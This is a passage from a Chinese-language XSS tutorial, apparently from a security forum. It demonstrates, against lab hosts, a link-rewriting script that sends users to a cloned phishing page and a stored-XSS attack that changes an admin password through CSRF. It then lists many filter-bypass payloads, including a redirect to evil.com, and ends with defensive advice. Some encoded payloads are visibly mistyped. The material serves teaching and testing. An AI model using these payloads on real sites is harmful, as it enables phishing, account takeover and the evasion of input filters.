[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c1c873c6717ae34d1bff89df0d6be4ed1f73b18b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c1c873c6717ae34d1bff89df0d6be4ed1f73b18b.png)

### 3.利用XSS进行钓鱼攻击

**实现步骤：**  
实验环境：cms靶场  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cd67f3624987b84cbd457be0c9fa5ad8b6902e94.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cd67f3624987b84cbd457be0c9fa5ad8b6902e94.png)  
1.点击忘记密码，跳转到http://10.10.29.134/admin/wjmm.php 页面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cfc60d4bc77e83902a1a1963541b01524c83d814.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cfc60d4bc77e83902a1a1963541b01524c83d814.png)  
2.创建一个php文件，内容为需要修改目标网页的内容，名字和网页中的相同，并放在自己web根目录下，实现钓鱼（也可以用网上的克隆的方法进行尝试）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c229d61da776ea4c895e9bd78055e22c6bd3ecba.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c229d61da776ea4c895e9bd78055e22c6bd3ecba.png)  
3.将刚刚做好的网址放置在具有xss注入的用户名框中也可以放置在url上（这里注入是通过url传参的），并将鼠标移至忘记密码查看跳转页面是否有变化

```html
http://10.10.29.134/admin/login.php?username=1234567asdfg"/><script>document.getElementsByTagName("body")[0].onload=function changeLink(){document.getElementById("myId").href="http://127.0.0.1/wjmm.php";}</script><a
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aa71e012fed7eb02dbb20fc6e3ad8e64ab5f157b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aa71e012fed7eb02dbb20fc6e3ad8e64ab5f157b.png)  
这时点击忘记密码，就跳转到我们刚刚仿照的页面上了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0459c231e4c3a6c78bf5c7ae8692c6d4af45e09a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0459c231e4c3a6c78bf5c7ae8692c6d4af45e09a.png)

### 4.配合CSRF攻击，实施进─步的攻击

**CSRF漏洞简单介绍：**  
CSRF(Cross-site request forgery)跨站请求伪造。  
CSRF漏洞产生的原因主要是因为关键的敏感请求可被伪造发出，而服务端接收处理未进行二次校验。  
**敏感请求**:增删改等操作请求，如添加账号，修改密码，删除文章等。  
**二次校验**:验证请求是由用户正常发起的校验方式，如图片和短信验证码，随机token，修改密码需同时提交旧密码等都属于二次校验。

由于在对管理员帐号编辑的地方，进行密码修改时没有进行2次校验或确认，存在CSRF漏洞，使用XSS脚本对该CSRF漏洞进行利用通过burp将需要伪造的http请求固有的属性复制到自己编写的代码中

**具体操作如下：**  
1.发现网站的留言板存在存储型xss漏洞  
输入`<script>alert(1);</script>`,弹出弹窗，说明存在xss注入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a35a49f788c267ac583043225502f6ab161d8380.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a35a49f788c267ac583043225502f6ab161d8380.png)  
弹出弹框  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-58fac1342afa3d6accb99482fe1b151106500051.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-58fac1342afa3d6accb99482fe1b151106500051.png)  
2.登录后台后，点击修改密码，修改密码为123456，并且使用burp进行抓包  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e8b0e0e756a202f8999efe931222ef962a9610d1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e8b0e0e756a202f8999efe931222ef962a9610d1.png)  
3.然后结合csrf漏洞，再根据数据包写一个JavaScript的脚本  
发送http头部请求和发送更改密码的指令，将账户admin的密码改为111  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-16c7bee34a64d7777574433d1d500987e2c37431.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-16c7bee34a64d7777574433d1d500987e2c37431.png)  
4.在留言框中写入脚本，点击留言  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c5663ab697318bc59e2b875e289f0e9403ea22a5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c5663ab697318bc59e2b875e289f0e9403ea22a5.png)  
5.当点击留言板时  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b90d2cb07ab4337d28518b7ac339f36f1617dd50.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b90d2cb07ab4337d28518b7ac339f36f1617dd50.png)  
6.登入原始的账户和密码，通过burp可以看到密码输入不正确，说明密码已经被服务器改了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-750d98e28e6cf9fb6639c4108ba00826042ce89e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-750d98e28e6cf9fb6639c4108ba00826042ce89e.png)  
使用修改后的111进行登录看看，登录成功。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5710aa472ff1bdf73d7b9f727006c43084ab347.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e5710aa472ff1bdf73d7b9f727006c43084ab347.png)

利用与绕过
-----

为了避免XSS漏洞的存在，通常应用会对用户输入进行一定的安全处理后再输出的HTML中，在进行XSS漏洞测试时需要推测出应用的安全处理方法(即防护规则)，并采用对应的绕过方式来进行绕过测试。通常防护规则会检测输入中是否有html标签或脚本的关键字并进行处理，根据处理方法的不同可分为过滤、编码、删除、插入等，有时会使用多种方法共同防护。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f74856b40e7d113a2c78d7e095eb5c0e91232eed.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f74856b40e7d113a2c78d7e095eb5c0e91232eed.png)

### 1.利用符号判断语句

```html
";!--"<XSS> =&{()}
```

**关键字判断:** script、alert、javascript、expression等......  
1.常见事件属性:

```html
onerror
onmouseover
onclick
onload
oninput
oncut
onscroll
..........
```

2.alert()的替代词:confirm()、prompt()

### 2.大小写绕过：

```html
<img src="javascript:alert(0);">
<IMG SRC="javascript:alert(0);">
<iMg sRC="jaVasCript:alert(0);">

<img src=1 onerror="alert(/1/)">
<iMg sRc=1 oNerror="alert(/1/)">
```

这个绕过方式的出现是因为网站仅仅只过滤了&lt;script&gt;标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-87a9ea0acb2c2b95d422258d49622a446f9c5099.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-87a9ea0acb2c2b95d422258d49622a446f9c5099.png)  
**利用语句：**

```html
http://192.168.1.102/xss/example2.php?name=<sCript>alert("hey!")</scRipt>
```

**其中：  
windows系统对大小写不敏感  
lunix系统对大小写敏感**

### 3.双写绕过：

```html
<script>alert(/xss/)</script>
<>alert(/xss/)</>
<scrscriptipt>alert(/xss/)</scrscriptipt>

<img src=1 onerror="alert(/1/)">
<img src=1 oonnerror="alert(/1/)">
```

**具体解题步骤:**  
1.任意输入，并按F12查看输出位置  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c1d22a931656f1f7045c236773ba12cfe69a15e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c1d22a931656f1f7045c236773ba12cfe69a15e4.png)  
2.在输出框输入'';!--"&lt;XSS&gt;=&amp;{()}。查看符号是否会被过滤或转义  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9f716a11e89b60e05e680c936f0d2bb1ea8bd216.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-9f716a11e89b60e05e680c936f0d2bb1ea8bd216.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5e4ea026c067272d343e6aab999b4a388e9b3d38.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5e4ea026c067272d343e6aab999b4a388e9b3d38.png)  
查看发现是以双引号闭合，符号未被过滤或者转义  
3.构造XSS语句进行注入

```html
"><script>alert(111)</script><"
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f9a4b43afbf1012dc548ab6da11c13d8fa1f6f3b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f9a4b43afbf1012dc548ab6da11c13d8fa1f6f3b.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7f75e2c56a465a915e25d25064bc79d89c11cc1e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7f75e2c56a465a915e25d25064bc79d89c11cc1e.png)  
发现script被过滤了  
4.这时我们进行双写绕过试试

```html
"><scrscriptipt>alert(111)</scrscriptipt><"
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-73e6550939250591900c37621c2110dc0a2dde65.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-73e6550939250591900c37621c2110dc0a2dde65.png)

**另一种形式：**  
利用过滤后返回语句再次构成攻击语句来绕过  
这个字面上不是很好理解，用实例来说。  
如下图，在这个例子中我们直接敲入script标签发现返回的网页代码中script标签被去除了，但其余的内容并没有改变。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-318c3e2edb48cbf02dea2a8c8d08349b3aaabe41.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-318c3e2edb48cbf02dea2a8c8d08349b3aaabe41.png)  
于是我们就可以人为的制造一种巧合，让过滤完script标签后的语句中还有script标签（毕竟alert函数还在），像这样：

```html
http://192.168.1.102/xss/example3.php?name=<sCri<script>pt>alert("hey!")</scRi</script>pt>
```

发现问题了吧，这个利用原理在于只过滤了一个script标签。

### 4.对标签属性值变换成ASCII码

ASCII编码也就是十进制编码。  
如t的ASCII为116，用&amp;#116表示;  
冒号:则表示为&amp;#58。

```html
<img src="javascript:alert(0);">
<img src="javascrip&#116&#58alert(0);">
```

将javascript:alert(1)转换成了ASCII码

```html
<a href=javascript:alert(1)>
<a href=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41>
```

### 5.对标签属性值进行十六进制编码

如a的十六进制编码为&amp;#x61，利用方式和ASCII编码一致。  
将javascript:alert(1)转换成了十六进制编码

```html
<a href=javascript:alert(1)>
<a href=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&tx70&#x74&tx3a&#x61&x6c&#x65&#x72&#x74&#x28&#x31&x29>
```

### 6.空格代替

空格可以使用多种字符来进行替代。  
如`/、//、%0a、%0d、Table键`出来的空白替代空格。

### 7.Base64编码

如`<script>alert("Hello");</script>`  
经过Base64编码后:  
`PHNjcmlwdD5hbGVydCgisGVsbG8iKTs8L3NjcmlwdD4=`

```html
<object data="data:text/html;base64,<script>alert("Hello");</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">

<META HTTP-EQUIV="refresh"CONTENT="O;url=data:text/html;base64,<script>alert("Hello");</script>">
<META HTTP-EQUIV="refresh"CONTENT="O;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

### 8.base64,16进制,10进制,编码再使用eval().window\[atob()\]函数执行

如: alert('XSS');  
经过JS 16进制编码后:  
`x61\x6clx65\x72\x74\x28\x27\x58x53\x53x27x29\x3b\xa`

```html
<script>eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b")</script>
```

Window\[atob('eval')\]:

```html
<script>window[atob('ZXZhbA==')]("\x61\x6cx65\x72\x74\x28\x27\x58\x53\x53\x27x29\x3b");</script>
```

9.参数间接传值
--------

思路:输入的语句并不会直接执行带有恶意的XSS payload语句，而是通过传递恶意语句到某些参数从而达到间接执行的目的。  
例1: <http://www.evil.com> 这个网站是一个恶意页面。<http://10.10.10.135/xss/test.php> 这是一个普通的测试页面。

```html
http://10.10.10.135/xss/test.php?name=test<input name="http://www.evil.com"value="xsstest" oninput="window.location=this.name">
http://www.evil.com可以直接替换成恶意语句如: javascript:alert(1)。
```

例2(IE&lt;=8版本)

```html
http://10.10.10.135/xss/test.php?name=test<a href="123”
id="x">test</a><script>x='javascript:alert(1)'</script><script>x.toString()=='123'</script>
```

XSS在实际应用中web程序往往会通过一些过滤规则来组织代有恶意代码的用户输入被显示。

### 10.编码脚本代码绕过关键字过滤

有的时候，服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行，简直太贴心了。

例如alert(1)编码过后就是

```html
\u0061\u006c\u0065\u0072\u0074(1)
```

所以构建出来的攻击语句如下：

```html
http://192.168.1.102/xss/example5.php?name=<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>
```

**主动闭合标签实现注入代码**  
来看这份代码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0642f46e0110c5fa9144eee18a7b28c7bf02ec5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0642f46e0110c5fa9144eee18a7b28c7bf02ec5.png)  
乍一看，哇！自带script标签。再一看，WTF！填入的内容被放在了变量里！  
这个时候就要我们手动闭合掉两个双引号来实现攻击，别忘了，javascript是一个弱类型的编程语言，变量的类型往往并没有明确定义。  
思路有了，接下来要做的就简单了，利用语句如下：

```html
http://192.168.1.102/xss/example6.php?name=";alert("I amcoming again~");"
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0a13caf8b362b5a57f58bd361f67b008b3ea020.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0a13caf8b362b5a57f58bd361f67b008b3ea020.png)  
回看以下注入完代码的网页代码，发现我们一直都在制造巧合。。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8527bee251408d383ac59184ec0b2a0f5a3bb05f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8527bee251408d383ac59184ec0b2a0f5a3bb05f.png)  
先是闭合引号，然后分号换行，加入代码，再闭合一个引号，搞定！

### 11.组合各种方式

在实际运用中漏洞的利用可能不会这么直观，需要我们不断的尝试，甚至组合各种绕过方式来达到目的。

**这些绕过攻击可以通过xss-lab练习  
在线xss-lab：<https://xssaq.com/yx/index.php>**

四：XSS的注意点
=========

**并不是只有script标签才可以插入代码**  
事件属性也可以  
在这个例子中，我们尝试了前面两种方法都没能成功，原因在于script标签已经被完全过滤，但不要方，能植入脚本代码的不止script标签。

例如这里我们用&lt;img&gt;标签做一个示范。

```html
http://192.168.1.102/xss/example4.php?name=<imgsrc='w.123' onerror='alert("hey!")'>
```

就可以再次愉快的弹窗。原因很简单，我们指定的图片地址根本不存在也就是一定会发生错误，这时候onerror里面的代码自然就得到了执行。

以下列举几个常用的可插入代码的标签。

```html
<a onmousemove='do something here'> 
```

当用户鼠标移动时即可运行代码

```html
<div onmouseover='do something here'> 
```

当用户鼠标在这个块上面时即可运行（可以配合weight等参数将div覆盖页面，鼠标不划过都不行）  
类似的还有onclick，这个要点击后才能运行代码，条件相对苛刻，就不再详述。

**XSS注入攻击的一般思路**  
1.找到可疑的注入点进行任意输入，并按F12查看输出位置  
2.在输出框输入'';!--"&lt;XSS&gt;=&amp;{()}。查看符号是否会被过滤或转义  
3.根据符号是否转义，构造XSS语句进行注入  
4.看是否有执行xss语句，如果没有尝试各种绕过  
5.最后利用xss注入与其他漏洞攻击进行配合

五：XSS漏洞的防御
==========

XSS漏洞防范
-------

XSS的威力主要是取决于JavaScript能够实现的程度，XSS跨站脚本的形成原因是对输入输出没有严格过滤，导致在页面上可以执行JavaScript等客户端代码，所以只要将敏感字符过滤，就可以修复XSS跨站漏洞。

修复和防范方法:
--------

1.Web客户端和服务端对用户的输入输出进行过滤或转义，如:&lt;， &gt;,script;  
⒉浏览器设置为高安全级别，Cookie属性HttpOnly设置为true，浏览器将禁止javascript访问带有HttpOnly属性的cookie;  
3.Web服务器安装WAF/IDS/IPS等产品，拦截攻击代码;  
4.关闭浏览器自动密码填写功能，防止被钓鱼页面、表单调取账号密码;

例:实现过滤特殊字符(图为DVWA中xss模块防御源码)︰

```html
<?php

header ("X-XSS-Protection:0");

// ls there any input?
if(array key _exists("name",$_ GET)&& $_GET['name']!=NULL){
// Get input
$name = preg replace( 'l<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'， ",$GET[ 'name' ] );

// Feedback for end user
echo "Hello ${name}";
}
?>
```

参考文献：  
<https://zhuanlan.zhihu.com/p/26177815>  
<https://xz.aliyun.com/t/9424>